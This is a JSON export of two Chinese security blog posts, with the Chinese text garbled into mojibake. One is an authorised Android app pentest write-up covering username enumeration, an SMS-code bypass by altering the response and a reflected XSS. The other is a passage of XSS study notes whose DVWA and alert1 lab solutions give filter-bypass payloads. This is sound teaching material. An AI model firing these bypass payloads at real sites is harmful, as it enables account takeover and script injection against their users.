{"total":50,"pageSize":8,"pageCount":7,"data":[{"title":"APP Penetration testing","slug":"Penetration-testing","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:52.700Z","comments":true,"path":"api/articles/Penetration-testing.json","excerpt":"","keywords":null,"cover":"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg","content":"<h1 id=\"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\"><a href=\"#è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\" class=\"headerlink\" title=\"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•\"></a>è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•</h1><p>ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•å°ç™½ï¼Œæœ¬æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½ä¸ºé‚£äº›å’Œæˆ‘ä¸€æ ·çš„å°ç™½æä¾›ä¸€äº›æµ‹è¯•æ€è·¯ã€‚</p>\n<p>æ¶‰åŠçš„å†…å®¹å¯èƒ½æ¯”è¾ƒåŸºç¡€ï¼Œè¡¨å“¥ä»¬è§è°…ã€‚</p>\n<h2 id=\"APK-è§£åŒ…\"><a href=\"#APK-è§£åŒ…\" class=\"headerlink\" title=\"APK è§£åŒ…\"></a>APK è§£åŒ…</h2><p>æ‹¿åˆ° apk ä¹‹åç›´æ¥ç”¨ 7-Zip è§£å‹å¯ä»¥å¾—åˆ°å‡ ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ª <strong>AndroidManifest.xml</strong> æ–‡ä»¶ã€ä¸€ä¸ªdexæ–‡ä»¶ã€‚ä½¿ç”¨ dex2jar <a href=\"https://sourceforge.net/projects/dex2jar/\" title=\"å·¥å…·\" target=\"_blank\" rel=\"noopener\">https://sourceforge.net/projects/dex2jar/</a> å°†è¿™ä¸ªdexæ–‡ä»¶è§£å‹ä¼šç”Ÿæˆä¸€ä¸ªjaræ–‡ä»¶ï¼Œç„¶åä½¿ç”¨jd-guiå°±å¯ä»¥æŸ¥çœ‹javaæºä»£ç äº†ã€‚</p>\n<p>å½“ç„¶å¯ä»¥ä»æºç é‡Œæ‰¾ä»£ç çš„æ¼æ´ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šæœ‰æ··æ·†ï¼Œåœ¨è¿™ä¹Ÿä¸åšæ·±å…¥è®¨è®ºã€‚</p>\n<p>ä¸Šè¾¹æåˆ°çš„ xml æ–‡ä»¶ä¸€å®šä¸èƒ½å‘æ”¾è¿‡ï¼Œé‡Œè¾¹æ¶‰åŠåˆ°è®¸å¤šé‡è¦çš„é…ç½®é¡¹ï¼Œæ¯”å¦‚ï¼š</p>\n<ul>\n<li>AndroidManifest.xmlæ–‡ä»¶ä¸­android:debuggableä¸ºtrueã€‚app å¯è¢«ä»»æ„è°ƒè¯•</li>\n<li>AndroidManifest.xmlæ–‡ä»¶ä¸­android: allowBackupä¸ºtrueã€‚app æ•°æ®å¯ä»¥è¢«å¤‡ä»½å¯¼å‡ºã€‚</li>\n<li>ç­‰ç­‰â€¦</li>\n</ul>\n<p>è¿˜æœ‰ä¸€ç‚¹åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å¯èƒ½ä¼šç”¨åˆ°ï¼šåœ¨å¯¹ apk è§£å‹ä¹‹åå¯ä»¥å°è¯•åœ¨ powershell é‡Œè¾¹æœä¸€ä¸‹ <code>db</code> æ–‡ä»¶ï¼Œè¯´ä¸å®šæœ‰æ•æ„Ÿä¿¡æ¯(ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Œå› ä¸ºæˆ‘ç¢°åˆ°è¿‡ä¸€æ¬¡â€¦)</p>\n<pre><code>for /r F:\\source-code %i in (*.db) do echo %i </code></pre><h2 id=\"ç™»é™†é¡µé¢\"><a href=\"#ç™»é™†é¡µé¢\" class=\"headerlink\" title=\"ç™»é™†é¡µé¢\"></a>ç™»é™†é¡µé¢</h2><h3 id=\"ç”¨æˆ·åå¯æšä¸¾\"><a href=\"#ç”¨æˆ·åå¯æšä¸¾\" class=\"headerlink\" title=\"ç”¨æˆ·åå¯æšä¸¾\"></a>ç”¨æˆ·åå¯æšä¸¾</h3><p>è¾“å…¥ç”¨æˆ·åä¹‹åå“åº”ç”¨æˆ·åä¸å­˜åœ¨ï¼Œè¿™å°±æ˜¯æœ€ç®€å•çš„æšä¸¾ç”¨æˆ·åçš„æƒ…å½¢äº†ã€‚</p>\n<p>è¿™æ¬¡ç¢°åˆ°çš„æ˜¯ç™»é™†ä¸éœ€è¦å¯†ç ï¼Œä½†æ˜¯è¦è¾“å…¥å·²ç»æ³¨å†Œè¿‡çš„ç”¨æˆ·åï¼Œä¹‹åä¼šæ ¹æ®ç”¨æˆ·åå‘é€éªŒè¯ç åˆ°å¯¹åº”æ‰‹æœºï¼ŒåŒæ—¶è®¾ç½®äº† 120s å†…ä¸èƒ½é‡æ–°å‘é€ï¼Œå¹¶ä¸”éªŒè¯ç  120s å†…æœ‰æ•ˆã€‚</p>\n<p>è¿™æ—¶å€™çœ‹èµ·æ¥æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡éªŒè¯ç åšä»€ä¹ˆäº‹ï¼Œä½†æ˜¯åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°</p>\n<ol>\n<li><p>å½“æˆ‘ä»¬è¾“å…¥å­˜åœ¨çš„è´¦å·ä¹‹åæç¤ºå‘é€æˆåŠŸï¼›</p>\n</li>\n<li><p>é‡å¤å‘é€ï¼Œä¼šå“åº” 120s å†…ä¸èƒ½é‡å¤å‘é€ï¼›</p>\n</li>\n<li><p>è¾“å…¥ä¸å­˜åœ¨ç”¨æˆ·ä¼šæç¤ºå‘é€å¤±è´¥ã€‚</p>\n</li>\n</ol>\n<p>æ‰€ä»¥è¿™ä¸ªæ—¶é—´é™åˆ¶å¯¹ç”¨æˆ·åæšä¸¾å…¶å®æ²¡ä»€ä¹ˆå½±å“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´ç”¨æˆ·åæ ¹æ®è¿”å›çš„ä¿¡æ¯æ¥æŸ¥çœ‹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg\" alt=\"æšä¸¾ç”¨æˆ·\"></p>\n<p>ç­‰ç­‰ï¼Œæ—¢ç„¶å’±éƒ½ä¸çŸ¥é“æ‰‹æœºå·ï¼Œä¹Ÿä¸è®©è¾“å¯†ç ç™»é™†ï¼Œå°±ç®—å¾—åˆ°ç”¨æˆ·åç”Ÿæˆç¤¾å·¥å­—å…¸ä¹Ÿæ²¡æ³•ç”¨å•Šï¼Œé‚£æ‹¿åˆ°äº†ç”¨æˆ·åæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p>\n<p>å½“ç„¶æœ‰ç”¨ï¼Œä¸è¿‡è¦çœ‹å…·ä½“åœºæ™¯ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ¡ˆä¾‹</p>\n<h3 id=\"ä»»æ„éªŒè¯ç ç»•è¿‡\"><a href=\"#ä»»æ„éªŒè¯ç ç»•è¿‡\" class=\"headerlink\" title=\"ä»»æ„éªŒè¯ç ç»•è¿‡\"></a>ä»»æ„éªŒè¯ç ç»•è¿‡</h3><p>å½“æˆ‘ä»¬ç™»é™†æ—¶æœåŠ¡ç«¯ç»™è´¦å·ç»‘å®šçš„æ‰‹æœºå·å‘é€çŸ­ä¿¡éªŒè¯ç ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªä¸Šä¸€æ­¥å¾—åˆ°çš„è´¦å·ï¼ŒéªŒè¯ç éšä¾¿è¾“ï¼Œç‚¹å‡»ç™»é™†åæŠ“åŒ…ï¼Œç™»é™†å¤±è´¥ï¼Œå‘ç°å“åº”ä¸­æœ‰ä¸¤ä¸ª code å­—æ®µ</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg\" alt></p>\n<p>æ”¹æ”¹è¯•è¯•ï¼š</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg\" alt></p>\n<p><strong>It works!</strong></p>\n<h2 id=\"åŠŸèƒ½é¡µé¢\"><a href=\"#åŠŸèƒ½é¡µé¢\" class=\"headerlink\" title=\"åŠŸèƒ½é¡µé¢\"></a>åŠŸèƒ½é¡µé¢</h2><p>æˆåŠŸç™»å½•ä¹‹åï¼Œå„ä¸ªåŠŸèƒ½éƒ½ç‚¹ç‚¹çœ‹çœ‹ï¼Œåœ¨ä¸ªäººä¿¡æ¯é¡µé¢æœ‰ä¸€ä¸ªæŸ¥è¯¢å®æ—¶åœ¨çº¿äººæ•°åŠŸèƒ½ï¼Œé‚£ä¸€æ åªæ˜¾ç¤ºäº†äººæ•°ï¼Œæ—è¾¹å¹¶æ²¡æœ‰ç®­å¤´</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg\" alt></p>\n<p>æˆ‘ä¸€åº¦ä»¥ä¸ºé‚£é‡Œä¸èƒ½ç‚¹å‡»(äº‹å®ä¸Šå› ä¸ºæ•°æ®é‡å¤ªå¤§ï¼ŒåŠ è½½äº†å¥½é•¿æ—¶é—´ï¼Œæˆ‘ç›´æ¥ç‚¹è¿”å›äº†ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯è¿™é‡Œæ²¡æœ‰ä¸œè¥¿)ï¼Œè¿›å»ä¹‹åå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰ç™»é™†äººå‘˜çš„ä¿¡æ¯äº†ã€‚</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg\" alt=\"å›¾æ‰“ç æ°´å¹³å®åœ¨ä¸å¤Ÿ\"></p>\n<p>åœ¨æˆ‘å°è¯•äº†ä¸åŒç”¨æˆ·ä¹‹åï¼Œå‘ç°è¿™é‡Œçš„ç”¨æˆ·ä¿¡æ¯å¹¶æ²¡æœ‰æƒé™é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼Œæ˜æ˜¾çš„æƒé™é…ç½®ä¸å½“ã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤–ï¼Œåº”ç”¨å­˜åœ¨å‡ å¤„æŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡BURP çœ‹åˆ°è¿”å›çš„æ•°æ®åŒ…éƒ½æ˜¯ JSON ç±»å‹</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg\" alt></p>\n<p>å› ä¸ºæ²¡ä»€ä¹ˆç»éªŒï¼Œæ‰€ä»¥å°±å¤šå°è¯•å—ï¼Œåœ¨ json é‚£é‡Œæ³¨å…¥ï¼Œxxe éƒ½æ¥ä¸€éï¼Œæ²¡å•¥ç”¨ã€‚</p>\n<p>å‰é¢è¿˜æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¯•è¯•ï¼Ÿ</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg\" alt></p>\n<p>æœ‰æˆï¼</p>\n<p>è¯•è¯• xss å§</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg\" alt></p>\n<p>æ”¾åˆ°æµè§ˆå™¨æˆåŠŸå¼¹çª—ï¼</p>\n<h1 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h1><p>å¹³æ—¶åšæµ‹è¯•è¿˜æ˜¯è¦ç»†å¿ƒï¼Œå¤šæ€»ç»“ï¼Œæ¯ä¸€ä¸ªèƒ½è¾“å…¥çš„åœ°æ–¹éƒ½ä¸èƒ½æ”¾è¿‡ï¼Œå¤šè¯•è¯•æ€»æ˜¯å¥½çš„ã€‚</p>\n","text":"è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•å°ç™½ï¼Œæœ¬æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½ä¸ºé‚£äº›å’Œæˆ‘ä¸€æ ·çš„å°ç™½æä¾›ä¸€äº›æµ‹è¯•æ€è·¯ã€‚æ¶‰åŠçš„å†…å®¹å¯èƒ½æ¯”è¾ƒåŸºç¡€ï¼Œè¡¨å“¥ä»¬è§è°…ã€‚APK è§£åŒ…æ‹¿åˆ° apk ä¹‹åç›´æ¥ç”¨ 7-Zip è§£å‹å¯ä»¥å¾—åˆ°å‡ ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ª AndroidManifest.xml æ–‡ä»¶ã€ä¸€ä¸ªdexæ–‡ä»¶","link":"","raw":null,"photos":[],"categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","count":5,"path":"api/categories/æ¸—é€æµ‹è¯•.json"}],"tags":[{"name":"APK","slug":"APK","count":1,"path":"api/tags/APK.json"}]},{"title":"XSS å­¦ä¹ ","slug":"xsså¤‡å¿˜","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xsså¤‡å¿˜.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"xsså¤‡å¿˜\"><a href=\"#xsså¤‡å¿˜\" class=\"headerlink\" title=\"xsså¤‡å¿˜\"></a>xsså¤‡å¿˜</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œé‡‡ç”¨æ­£åˆ™ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒå†™ã€å¤§å°å†™æ··æ·†ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„äº‹ä»¶æ ‡ç­¾ï¼š</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name å¤„é•¿åº¦é™åˆ¶ï¼Œ Message å¤„å°è¯• <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚  <code>addslashes</code>  è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼› <code>htmlspecialchars</code> å¯¹å‚æ•°è¿›è¡Œå®ä½“ç¼–ç ï¼Œæ— æ³•å†å¯¹ <code>message</code> è¿›è¡Œ XSS ï¼Œä½†æ˜¯ <code>name</code> å¤„å¯ä»¥é€šè¿‡ä¿®æ”¹é•¿åº¦è¿›è¡Œ xssã€‚</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>ä¼¼æ›¾ç›¸è¯†å‘¢ğŸ˜‹</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>è¿‡æ»¤äº† <code>&lt;script</code> ,è§‚å¯Ÿé¡µé¢æºç ï¼Œæ‰‹åŠ¨é—­åˆäº‹ä»¶æ ‡ç­¾ <code>&lt;/option&gt;</code> ã€ <code>&lt;/select&gt;</code>ï¼Œç”±äºä»£ç åªæ£€æµ‹ <code>$default</code> ,äºæ˜¯æˆ‘ä»¬åé¢çš„ä»£ç å¯ä»¥é€ƒé€¸ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL ä¸­æ‰€æœ‰åœ¨ # ä¹‹åçš„éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œå› æ­¤ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ¶æ„ä»£ç ä¼šåœ¨åˆ›å»ºé¡µé¢æ—¶è¢«ç”¨æ¥æ¸²æŸ“<br>è¯»å–é¡µé¢å†…å®¹ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>æµè§ˆå™¨å¦‚ä½•æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å›½å¤–çš„æ–‡ç« ï¼š<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTMLäº‹ä»¶å±æ€§ï¼š<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\"><a href=\"#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\" class=\"headerlink\" title=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº\"></a>ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</h1><p>é¶åœºåœ°å€ï¼š<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„å€¼æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ <code>&quot;</code> åŠ äº†ä¸€ä¸ªè½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæˆ–è€…ç”¨ <code>\\</code> å†æ¬¡è½¬ä¹‰</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>ä¸ç¬¬äºŒé¢˜ä¸€æ ·</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>ç¬¬ä¸€è¡Œè¿‡æ»¤å°†æ‰€æœ‰ <code>&lt; &quot;</code> è¿›è¡Œå®ä½“ç¼–ç </p>\n<p>ç¬¬äºŒè¡Œå°†æ‰€æœ‰ <code>http://S+</code> æ›¿æ¢ä¸º <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,è¿™é‡Œ S+ ä¸ºåŒ¹é…ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p>\n<p>ç¬¬ä¸‰è¡Œå°† <code>[[a|b]]</code> æ›¿æ¢ä¸º <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>è¾“å‡ºï¼š</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>é€šè¿‡ <code>http://onerror=alert(1)//</code> å¼•å…¥ <code>alt=&quot;***&quot;</code> ,æ­¤æ—¶å¼•å·å†…çš„å†…å®¹è§¦å‘ç¬¬äºŒè¡Œçš„æ£€æµ‹ æ›¿æ¢ä¸º<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> æ­¤æ—¶ <code>href</code> å¸¦æ¥çš„ <code>&quot;</code> å°† <code>alt</code> çš„å¼•å·é—­åˆï¼ŒåŒæ—¶ <code>//</code> å°†åé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œé€ æˆ <code>http://onerror=alert(1)</code> é€ƒé€¸å‡ºæ¥ã€‚</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>é€šè¿‡ <code>split</code> å¯¹ä¼ å…¥çš„ s è¿›è¡Œåˆ†å‰²<br>    var s=â€creat#fooâ€; var m=s.split(/#/); m<br>    Array [ â€œcreatâ€, â€œfooâ€ ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>ç›¸å½“äºè°ƒç”¨äº† document.creatXXX() 